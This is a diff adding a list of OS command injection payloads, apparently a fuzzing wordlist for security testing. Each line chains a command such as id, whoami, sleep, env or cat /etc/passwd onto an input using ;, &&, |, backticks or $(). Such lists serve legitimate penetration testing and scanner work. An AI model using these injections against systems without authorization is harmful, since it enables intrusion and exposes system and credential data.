@@ -1,0 +1,63 @@
+; id
+; whoami
+; uname -a
+; ls
+; pwd
+; cat /etc/passwd
+; echo INJECTED
+&& id
+&& whoami
+&& uname -a
+&& ls
+&& echo INJECTED
+| id
+| whoami
+| uname -a
+| ls
+| echo INJECTED
+`id`
+`whoami`
+$(id)
+$(whoami)
+; printf INJECTED
+&& printf INJECTED
+| printf INJECTED
+; sleep 5
+&& sleep 5
+| sleep 5
+; ping -c 3 127.0.0.1
+&& ping -c 3 127.0.0.1
+| ping -c 3 127.0.0.1
+; echo $(id)
+&& echo $(whoami)
+; echo $USER
+; echo $HOME
+; echo $PATH
+; env
+; printenv
+&& env
+| env
+; cat /etc/hostname
+; cat /proc/version
+; ls /home
+; ls /root
+; ls /var/www
+; ls /tmp
+; echo START$(id)END
+; echo START$(whoami)END
+; echo AAA$(id)BBB
+; echo AAA$(whoami)BBB
+; expr 1 + 1
+; test 1 -eq 1
+; date
+; uptime
+; hostname
+; echo X; id
+; echo X && id
+; echo X | id
+; true; id
+; false || id
+; id #
+; whoami #
+; id //
+; whoami //
